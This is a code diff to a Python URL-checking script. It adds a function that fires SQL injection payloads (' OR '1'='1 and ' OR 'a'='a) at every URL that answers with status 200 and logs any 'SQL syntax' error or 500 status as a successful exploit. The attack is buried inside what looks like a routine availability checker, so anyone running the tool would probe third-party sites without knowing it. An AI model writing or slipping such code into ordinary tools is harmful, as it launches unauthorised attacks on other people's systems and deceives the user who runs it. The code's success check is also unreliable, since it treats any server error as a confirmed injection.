@@ -28,6 +28,8 @@ def check_url(url, max_retries=3):
                 result += f"\nRedirected from {response.url} to {response.history[-1].url}"
             if response.status_code == 200:
                 result += f"\nSuccess! Status Code: {response.status_code}"
+                # Attempt SQL Injection Exploit
+                exploit_sql_injection(url)
             elif response.status_code == 301:
                 result += "\nMoved Permanently"
             elif response.status_code == 302:
@@ -53,6 +55,37 @@ def check_url(url, max_retries=3):
             else:
                 print(f"Retrying ({retries}/{max_retries}) for {url}")
                 time.sleep(2)  # Wait before retrying
+
+# Exploit function for SQL Injection
+def exploit_sql_injection(url):
+    """
+    Attempts SQL Injection by modifying a common parameter with a SQL payload.
+    """
+    payloads = ["' OR '1'='1", "' OR 'a'='a"]
+    vulnerable = False
+    
+    for payload in payloads:
+        exploit_url = f"{url}?id={payload}"
+        print(f"Attempting SQL Injection on {exploit_url}")
+        
+        try:
+            response = requests.get(exploit_url, timeout=10)
+            
+            # Check for signs of SQL Injection vulnerability
+            if "SQL syntax" in response.text or response.status_code == 500:
+                logging.info(f"Successful SQL Injection on {exploit_url} with payload {payload}")
+                print(f"Exploitation successful on {exploit_url}")
+                vulnerable = True
+                break  # Exit loop on success
+            else:
+                print(f"No SQL Injection vulnerability detected on {exploit_url}")
+        
+        except requests.exceptions.RequestException as e:
+            print(f"Error during exploitation attempt on {exploit_url}: {e}")
+            logging.error(f"Failed exploitation attempt on {exploit_url}: {e}")
+    
+    if not vulnerable:
+        logging.info(f"No SQL Injection vulnerability detected for {url}")
 
 # Function to handle multiple URLs concurrently
 def check_urls_concurrently(url_list):
